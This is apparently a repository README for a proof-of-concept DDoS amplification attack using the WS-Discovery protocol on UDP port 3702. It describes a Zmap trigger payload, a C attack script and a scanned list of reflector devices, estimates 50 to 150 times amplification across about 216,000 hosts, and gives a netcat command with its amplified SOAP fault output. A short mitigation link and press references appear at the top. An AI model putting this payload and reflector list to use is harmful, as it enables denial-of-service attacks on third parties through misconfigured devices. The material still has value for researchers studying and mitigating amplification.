# Web Service Discovery protocol amplification PoC (port 3702)

Edit: This has now been reported on and referenced by NETSCOUT and ZDNet. https://www.zdnet.com/article/protocol-used-by-630000-devices-can-be-abused-for-devastating-ddos-attacks/

### Mitigation Options
 - https://pastebin.com/raw/2dtMxFUk

### About
Yet another bloody UDP insecure service, this time similar to other abused SOAP protocols but needing no trigger payload.
Shodan showed 216,313 possible reflectors with the biggest number from Vietnam followed by United States.

I'm not Akamai so ill be waiting to see their report, but from what I can measure with overhead additions, the amps range from 50 to 150x.

I've scanned and filtered a list that will be alongside this script.

### Contents
- WSD_3702.pkt - Zmap payload ("<\xaa>" or any WSD centric discovery payload will work)
- wsd.c - Standard socket template with my corrections
- wsd.list - Example amp list

### Malformed Input Amplification Example
- nc -u x.x.x.x 3702 < <(echo ':')
- Output:
`<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Fault xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsdd="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:chan="http://schemas.microsoft.com/ws/2005/02/duplex" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa5="http://www.w3.org/2005/08/addressing" xmlns:xmime="http://tempuri.org/xmime.xsd" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:wsrfbf="http://docs.oasis-open.org/wsrf/bf-2" xmlns:wstop="http://docs.oasis-open.org/wsn/t-1" xmlns:wsrfr="http://docs.oasis-open.org/wsrf/r-2" xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:tt="http://www.onvif.org/ver10/schema" xmlns:ter="http://www.onvif.org/ver10/error" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns:trt="http://www.onvif.org/ver10/media/wsdl" xmlns:tev="http://www.onvif.org/ver10/events/wsdl" xmlns:tdn="http://www.onvif.org/ver10/network/wsdl" xmlns:timg="http://www.onvif.org/ver20/imaging/wsdl" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tan="http://www.onvif.org/ver20/analytics/wsdl"><faultcode>SOAP-ENV:Client</faultcode><faultstring>No tag: no XML root element or missing SOAP message body element</faultstring></SOAP-ENV:Fault>`
